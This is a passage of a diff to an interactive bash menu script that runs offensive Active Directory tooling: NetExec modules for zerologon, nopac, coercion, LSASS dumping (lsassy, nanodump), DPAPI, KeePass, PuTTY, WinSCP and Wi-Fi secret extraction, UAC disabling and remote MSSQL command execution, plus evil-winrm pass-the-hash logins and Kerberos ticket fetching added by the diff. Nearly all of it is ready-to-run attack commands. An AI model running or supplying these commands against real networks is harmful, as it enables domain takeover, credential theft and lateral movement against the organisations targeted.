-                  7) nxc winrm domain -u 'user' -p 'password'
-          	  8) nxc ldap domain -u 'user' -p 'password' --bloodhound --collection all --dns-server ip
-                  9) nxc smb domain --generate-krb5-file domain-krb5.conf
-                  10) nxc smb domain -u 'user' -p 'password' -M timeroast
-                  11) nxc smb domain -u "user" -p 'password' --pass-pol
-                  12) nxc ldap domain -u 'user' -p 'password' --groups
-                  13) nxc ldap domain -u 'user' -p 'password' --computers
-                  14) nxc ldap domain -u 'user' -p 'password' --get-sid
-                  15) nxc ldap domain -u 'user' -p 'password' -M enum_trusts
-                  16) nxc ldap domain -u 'user' -p 'password' -M maq
-                  17) nxc smb domain -u 'user' -p 'password' -M zerologon
-                  18) nxc smb domain -u 'user' -p 'password' -M coerce_plus
-                  19) nxc smb domain -u 'user' -p 'password' -M nopac
-                  20) nxc smb domain -u 'user' -p 'password' -M gpp_password 
-                  21) nxc smb domain -u 'user' -p 'password' -M lsassy
-                  22) nxc ldap domain -u 'user' -p 'password' -M subnets
-		  23) nxc ldap domain -u 'user' -p 'password' -M pre2k
-		  24) nxc ldap domain -u 'user' -p 'password' -M laps
-	  	  25) nxc ldap domain -u 'user' -p 'password' -M pso
-		  26) nxc ldap domain -u 'user' -p 'password' -M adcs
-                  27) nxc smb domain -u 'user' -p 'password' -M enum_ca
-                  28) nxc smb domain -u 'user' -p 'password' -M bitlocker
-                  29) nxc smb domain -u 'user' -p 'password' -M dpapi_hash
-                  30) nxc smb domain -u 'user' -p 'password' -M nanodump
-                  31) nxc smb domain -u 'user' -p 'password' -M remote-uac -o ACTION=disable
-                  32) nxc smb domain -u 'user' -p 'password' -M ioxidresolver
-                  33) nxc smb domain -u 'user' -p 'password' -M backup_operator
-                  34) nxc smb domain -u 'user' -p 'password' -M keepass_discover
-                  35) nxc smb domain -u 'user' -p 'password' -M powershell_history
-                  36) nxc smb domain -u 'user' -p 'password' -M recent_files
-                  37) nxc smb domain -u 'user' -p 'password' -M winscp
-                  38) nxc smb domain -u 'user' -p 'password' -M teams_localdb
-                  39) nxc smb domain -u 'user' -p 'password' -M mremoteng
-                  40) nxc smb domain -u 'user' -p 'password' -M mobaxterm
-                  41) nxc smb domain -u 'user' -p 'password' -M putty
-                  42) nxc smb domain -u 'user' -p 'password' -M rdcman
-                  43) nxc smb domain -u 'user' -p 'password' -M wifi
-                  44) nxc smb domain -u 'user' -p 'password' --dpapi 
-                  45) nxc ldap domain -u 'user' -p 'password' --gmsa
-                  46) nxc mssql domain --local-auth -u 'user' -p 'password' -x 'command' 
-               "
+                  5) nxc smb domain -u 'user' -p 'password' -M spider_plus
+                  6) nxc smb domain -u 'user' -p 'password' --loggedon-users
+                  7) nxc smb domain -u 'user' -p 'password' -M enum_av
+                  8) nxc winrm domain -u 'user' -p 'password'
+          	  9) nxc ldap domain -u 'user' -p 'password' --bloodhound --collection all --dns-server ip
+                  10) nxc smb domain --generate-krb5-file domain-krb5.conf
+                  11) nxc smb domain -u 'user' -p 'password' -M timeroast
+                  12) nxc smb domain -u "user" -p 'password' --pass-pol
+                  13) nxc ldap domain -u 'user' -p 'password' --groups
+                  14) nxc ldap domain -u 'user' -p 'password' --computers
+                  15) nxc ldap domain -u 'user' -p 'password' --get-sid
+                  16) nxc ldap domain -u 'user' -p 'password' -M enum_trusts
+                  17) nxc ldap domain -u 'user' -p 'password' -M maq
+                  18) nxc smb domain -u 'user' -p 'password' -M zerologon
+                  19) nxc smb domain -u 'user' -p 'password' -M coerce_plus
+                  20) nxc smb domain -u 'user' -p 'password' -M nopac
+                  21) nxc smb domain -u 'user' -p 'password' -M gpp_password 
+                  22) nxc smb domain -u 'user' -p 'password' -M lsassy
+                  23) nxc ldap domain -u 'user' -p 'password' -M subnets
+		  24) nxc ldap domain -u 'user' -p 'password' -M pre2k
+		  25) nxc ldap domain -u 'user' -p 'password' -M laps
+	  	  26) nxc ldap domain -u 'user' -p 'password' -M pso
+		  27) nxc ldap domain -u 'user' -p 'password' -M adcs
+                  28) nxc smb domain -u 'user' -p 'password' -M enum_ca
+                  29) nxc smb domain -u 'user' -p 'password' -M bitlocker
+                  30) nxc smb domain -u 'user' -p 'password' -M dpapi_hash
+                  31) nxc smb domain -u 'user' -p 'password' -M nanodump
+                  32) nxc smb domain -u 'user' -p 'password' -M remote-uac -o ACTION=disable
+                  33) nxc smb domain -u 'user' -p 'password' -M ioxidresolver
+                  34) nxc smb domain -u 'user' -p 'password' -M backup_operator
+                  35) nxc smb domain -u 'user' -p 'password' -M keepass_discover
+                  36) nxc smb domain -u 'user' -p 'password' -M powershell_history
+                  37) nxc smb domain -u 'user' -p 'password' -M recent_files
+                  38) nxc smb domain -u 'user' -p 'password' -M winscp
+                  39) nxc smb domain -u 'user' -p 'password' -M teams_localdb
+                  40) nxc smb domain -u 'user' -p 'password' -M mremoteng
+                  41) nxc smb domain -u 'user' -p 'password' -M mobaxterm
+                  42) nxc smb domain -u 'user' -p 'password' -M putty
+                  43) nxc smb domain -u 'user' -p 'password' -M rdcman
+                  44) nxc smb domain -u 'user' -p 'password' -M wifi
+                  45) nxc smb domain -u 'user' -p 'password' --dpapi 
+                  46) nxc ldap domain -u 'user' -p 'password' --gmsa
+                  47) nxc ldap domain -u 'user' -p 'password' --trusted-for-delegation 
+                  48) nxc ldap domain -u 'user' -p 'password' -M ldap-checker
+                  49) nxc mssql domain --local-auth -u 'user' -p 'password' -x 'command' 
+               " 
        	       read_input number $'\033[35m# \033[0m'
                if [[ "$number" == ".." ]]; then
                   history -a "$HISTFILE"                
@@ -3585,6 +4267,48 @@ EOF
           	  nxc smb $Domain -u $User -p $Password --shares $flag
           	  echo ""
                elif [[ "$number" == "5" ]]; then
+                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
+                  read_input User $'\033[35mEnter The User : \033[0m' 
+                  read_input Password $'\033[35mEnter The Password : \033[0m'
+                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
+                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
+                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                        flag="-k"
+                        dc_host="-dc-host $Domain"
+                        dc_ip="--dc-ip $Ip"
+                        shopt -s extglob nocasematch
+                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
+                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
+                        else
+                            CLEAN_DOMAIN="$Domain"
+                        fi
+                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
+                        flag=""
+                        dc_host="" 
+                        dc_ip=""        
+                        shopt -s extglob nocasematch
+                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
+                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
+                        else
+                            CLEAN_DOMAIN="$Domain"
+                        fi
+                  else 
+                        flag=""
+                        dc_host="" 
+                        dc_ip=""        
+                        shopt -s extglob nocasematch
+                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
+                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
+                        else
+                            CLEAN_DOMAIN="$Domain"
+                        fi
+                  fi
+                  echo ""
+                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M spider_plus $flag --[+]\033[0m"
+                  echo ""
+                  nxc smb $Domain -u $User -p $Password -M spider_plus $flag
+                  echo ""
+               elif [[ "$number" == "6" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m' 
@@ -3626,7 +4350,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password --loggedon-users $flag 
                   echo ""
-               elif [[ "$number" == "6" ]]; then
+               elif [[ "$number" == "7" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m' 
@@ -3668,7 +4392,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M enum_av $flag
                   echo ""
-               elif [[ "$number" == "7" ]]; then
+               elif [[ "$number" == "8" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m' 
@@ -3710,7 +4434,7 @@ EOF
                   echo ""
                   nxc winrm $Domain -u $User -p $Password $flag
                   echo ""
-               elif [[ "$number" == "8" ]]; then
+               elif [[ "$number" == "9" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m' 
@@ -3753,7 +4477,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password --bloodhound --collection all --dns-server $Ip $flag
                   echo ""
-             elif [[ "$number" == "9" ]]; then
+             elif [[ "$number" == "10" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                   read_input File $'\033[35mEnter The Output File : \033[0m'
                   read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m' 
@@ -3794,7 +4518,7 @@ EOF
                   echo ""
  		  nxc smb $Domain --generate-krb5-file $File $flag
                   echo ""
-             elif [[ "$number" == "10" ]]; then
+             elif [[ "$number" == "11" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m' 
@@ -3836,7 +4560,7 @@ EOF
                   echo ""
  	          nxc smb $Domain -u $User -p $Password -M timeroast $flag
                   echo ""
-               elif [[ "$number" == "11" ]]; then
+               elif [[ "$number" == "12" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -3878,7 +4602,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password --pass-pol $flag
                   echo ""
-               elif [[ "$number" == "12" ]]; then
+               elif [[ "$number" == "13" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -3920,7 +4644,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password --groups $flag
                   echo ""
-               elif [[ "$number" == "13" ]]; then
+               elif [[ "$number" == "14" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -3962,7 +4686,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password --computers $flag
                   echo ""
-               elif [[ "$number" == "14" ]]; then
+               elif [[ "$number" == "15" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4004,7 +4728,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password --get-sid $flag
                   echo ""
-               elif [[ "$number" == "15" ]]; then
+               elif [[ "$number" == "16" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4046,7 +4770,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password -M enum_trusts $flag
                   echo ""
-               elif [[ "$number" == "16" ]]; then
+               elif [[ "$number" == "17" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4088,7 +4812,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password -M maq $flag
                   echo ""
-               elif [[ "$number" == "17" ]]; then
+               elif [[ "$number" == "18" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4130,7 +4854,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M zerologon $flag
                   echo ""
-               elif [[ "$number" == "18" ]]; then
+               elif [[ "$number" == "19" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4172,7 +4896,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M coerce_plus $flag
                   echo ""
-               elif [[ "$number" == "19" ]]; then
+               elif [[ "$number" == "20" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4214,7 +4938,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M nopac $flag
                   echo ""
-               elif [[ "$number" == "20" ]]; then
+               elif [[ "$number" == "21" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4256,7 +4980,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M gpp_password $flag
                   echo ""
-               elif [[ "$number" == "21" ]]; then
+               elif [[ "$number" == "22" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4298,7 +5022,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M lsassy $flag
                   echo ""
-               elif [[ "$number" == "22" ]]; then
+               elif [[ "$number" == "23" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4340,7 +5064,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password -M subnets $flag
                   echo ""
-               elif [[ "$number" == "23" ]]; then
+               elif [[ "$number" == "24" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4382,7 +5106,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password -M pre2k $flag
                   echo ""
-               elif [[ "$number" == "24" ]]; then
+               elif [[ "$number" == "25" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4424,7 +5148,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password -M laps $flag
                   echo ""
-               elif [[ "$number" == "25" ]]; then
+               elif [[ "$number" == "26" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4466,7 +5190,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password -M pso $flag
                   echo ""
-               elif [[ "$number" == "26" ]]; then
+               elif [[ "$number" == "27" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4508,7 +5232,7 @@ EOF
                   echo ""
                   nxc ldap $Domain -u $User -p $Password -M adcs $flag
                   echo ""
-               elif [[ "$number" == "27" ]]; then
+               elif [[ "$number" == "28" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4550,7 +5274,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M enum_ca $flag
                   echo ""
-               elif [[ "$number" == "28" ]]; then
+               elif [[ "$number" == "29" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4592,7 +5316,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M bitlocker $flag
                   echo ""
-               elif [[ "$number" == "29" ]]; then
+               elif [[ "$number" == "30" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4634,7 +5358,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M dpapi_hash $flag
                   echo ""
-               elif [[ "$number" == "30" ]]; then
+               elif [[ "$number" == "31" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4676,7 +5400,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M nanodump $flag
                   echo ""
-               elif [[ "$number" == "31" ]]; then
+               elif [[ "$number" == "32" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4718,7 +5442,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M remote-uac -o ACTION=disable $flag
                   echo ""
-               elif [[ "$number" == "32" ]]; then
+               elif [[ "$number" == "33" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4760,7 +5484,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M ioxidresolver $flag
                   echo ""
-               elif [[ "$number" == "33" ]]; then
+               elif [[ "$number" == "34" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4802,7 +5526,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M backup_operator $flag
                   echo ""
-               elif [[ "$number" == "34" ]]; then
+               elif [[ "$number" == "35" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4844,7 +5568,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M keepass_discover $flag
                   echo ""
-               elif [[ "$number" == "35" ]]; then
+               elif [[ "$number" == "36" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4886,7 +5610,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M powershell_history $flag
                   echo ""
-               elif [[ "$number" == "36" ]]; then
+               elif [[ "$number" == "37" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4928,7 +5652,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M recent_files $flag
                   echo ""
-               elif [[ "$number" == "37" ]]; then
+               elif [[ "$number" == "38" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -4970,7 +5694,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M winscp $flag
                   echo ""
-               elif [[ "$number" == "38" ]]; then
+               elif [[ "$number" == "39" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -5012,7 +5736,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M teams_localdb $flag
                   echo ""
-               elif [[ "$number" == "39" ]]; then
+               elif [[ "$number" == "40" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -5054,7 +5778,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M mremoteng $flag
                   echo ""
-               elif [[ "$number" == "40" ]]; then
+               elif [[ "$number" == "41" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -5096,7 +5820,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M mobaxterm $flag
                   echo ""
-               elif [[ "$number" == "41" ]]; then
+               elif [[ "$number" == "42" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -5138,7 +5862,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M putty $flag
                   echo ""
-               elif [[ "$number" == "42" ]]; then
+               elif [[ "$number" == "43" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -5180,7 +5904,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M rdcman $flag
                   echo ""
-               elif [[ "$number" == "43" ]]; then
+               elif [[ "$number" == "44" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -5222,7 +5946,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password -M wifi $flag
                   echo ""
-               elif [[ "$number" == "44" ]]; then
+               elif [[ "$number" == "45" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m'
@@ -5264,7 +5988,7 @@ EOF
                   echo ""
                   nxc smb $Domain -u $User -p $Password --dpapi $flag
                   echo ""
-               elif [[ "$number" == "45" ]]; then
+               elif [[ "$number" == "46" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m' 
@@ -5305,7 +6029,89 @@ EOF
                   echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password --gmsa $flag --[+]\033[0m"
                   nxc ldap $Domain -u $User -p $Password --gmsa $flag
                   echo ""
-               elif [[ "$number" == "46" ]]; then
+ 	       elif [[ "$number" == "47" ]]; then
+                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
+                  read_input User $'\033[35mEnter The User : \033[0m' 
+                  read_input Password $'\033[35mEnter The Password : \033[0m' 
+                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
+                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
+                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                        flag="-k"
+                        dc_host="-dc-host $Domain"
+                        dc_ip="--dc-ip $Ip"
+                        shopt -s extglob nocasematch
+                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
+                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
+                        else
+                            CLEAN_DOMAIN="$Domain"
+                        fi
+                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
+                        flag=""
+                        dc_host="" 
+                        dc_ip=""        
+                        shopt -s extglob nocasematch
+                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
+                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
+                        else
+                            CLEAN_DOMAIN="$Domain"
+                        fi
+                  else 
+                        flag=""
+                        dc_host="" 
+                        dc_ip=""        
+                        shopt -s extglob nocasematch
+                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
+                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
+                        else
+                            CLEAN_DOMAIN="$Domain"
+                        fi
+                  fi
+                  echo ""
+		  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password --trusted-for-delegation $flag --[+]\033[0m"
+		  nxc ldap $Domain -u $User -p $Password --trusted-for-delegation $flag
+                  echo ""
+               elif [[ "$number" == "48" ]]; then
+                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
+                  read_input User $'\033[35mEnter The User : \033[0m' 
+                  read_input Password $'\033[35mEnter The Password : \033[0m' 
+                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
+                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
+                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                        flag="-k"
+                        dc_host="-dc-host $Domain"
+                        dc_ip="--dc-ip $Ip"
+                        shopt -s extglob nocasematch
+                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
+                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
+                        else
+                            CLEAN_DOMAIN="$Domain"
+                        fi
+                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
+                        flag=""
+                        dc_host="" 
+                        dc_ip=""        
+                        shopt -s extglob nocasematch
+                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
+                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
+                        else
+                            CLEAN_DOMAIN="$Domain"
+                        fi
+                  else 
+                        flag=""
+                        dc_host="" 
+                        dc_ip=""        
+                        shopt -s extglob nocasematch
+                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
+                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
+                        else
+                            CLEAN_DOMAIN="$Domain"
+                        fi
+                  fi
+                  echo ""
+                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password -M ldap-checker $flag --[+]\033[0m"
+                  nxc ldap $Domain -u $User -p $Password -M ldap-checker $flag
+                  echo ""
+               elif [[ "$number" == "49" ]]; then
                   read_input Domain $'\033[35mEnter The Domain : \033[0m'
                   read_input User $'\033[35mEnter The User : \033[0m' 
                   read_input Password $'\033[35mEnter The Password : \033[0m' 
@@ -5600,7 +6406,8 @@ EOF
            \033[0m"
            echo "
                1) evil-winrm -i domain -u user -p password
-	       2) evil-winrm -i DC -r domain -u user
+               2) evil-winrm -i domain -u user -H hash
+	       3) evil-winrm -i DC -r domain -u user
            "
            read_input number $'\033[35m# \033[0m'
            if [[ "$number" == ".." ]]; then
@@ -5624,7 +6431,25 @@ EOF
 	       evil-winrm -i $Domain -u $User -p $Password
                echo ""
            elif [[ "$number" == "2" ]]; then
+               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                read_input User $'\033[35mEnter The User : \033[0m' 
+               read_input Hash $'\033[35mEnter The Hash : \033[0m' 
+               sudo ntpdate -s $Domain
+               echo ""
+               echo -e "\033[36m[+]-- Running nxc smb $Domain --generate-krb5-file /tmp/domain-krb5.conf --[+]\033[0m"
+               echo ""
+               nxc smb $Domain --generate-krb5-file /tmp/domain-krb5.conf
+               sudo cp /tmp/domain-krb5.conf /etc/krb5.conf 
+               echo ""
+               echo -e "\e[1;32mConfiguring /etc/krb5.conf ... \e[0m" 
+               echo ""
+               echo -e "\033[36m[+]-- Running evil-winrm -i $Domain -u $User -H $Hash --[+]\033[0m"
+               echo ""
+               evil-winrm -i $Domain -u $User -H $Hash
+               echo ""
+           elif [[ "$number" == "3" ]]; then
+               read_input User $'\033[35mEnter The User : \033[0m' 
+               read_input Password $'\033[35mEnter The (Password\Hash) : \033[0m'
                read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                read_input DC $'\033[35mEnter The DC : \033[0m' 
                sudo ntpdate -s $DC
@@ -5636,6 +6461,14 @@ EOF
                echo ""
                echo -e "\e[1;32mConfiguring /etc/krb5.conf ... \e[0m" 
                echo ""
+               echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"
+               echo ""
+               getTGT.py $Domain/$User -hashes :$Password -dc-ip $DC -k
+               getTGT.py $Domain/$User:$Password -dc-ip $DC -k
+               echo ""
+               echo -e "\e[1;32m[*] Export KRB5CCNAME=$User.ccache ... \e[0m"
+               echo "" 
+               export KRB5CCNAME=$User.ccache
                echo -e "\033[36m[+]-- Running evil-winrm -i $DC -r $Domain -u $User --[+]\033[0m"
                echo ""
 	       evil-winrm -i $DC -r $Domain -u $User
@@ -5700,6 +6533,13 @@ EOF
                echo ""
                echo -e "\033[36m[+]-- Running powerview $Domain/$User:'$Password'@$DC -k --[+]\033[0m"
                echo ""
+               echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"
+               echo ""
+               getTGT.py $Domain/$User:$Password -dc-ip $DC -k
+               echo ""
+               echo -e "\e[1;32m[*] Export KRB5CCNAME=$User.ccache ... \e[0m"
+               echo "" 
+               export KRB5CCNAME=$User.ccache
                powerview $Domain/$User:$Password@$DC -k
                echo ""
            elif [[ "$number" == "exit" ]]; then
@@ -5709,6 +6549,61 @@ EOF
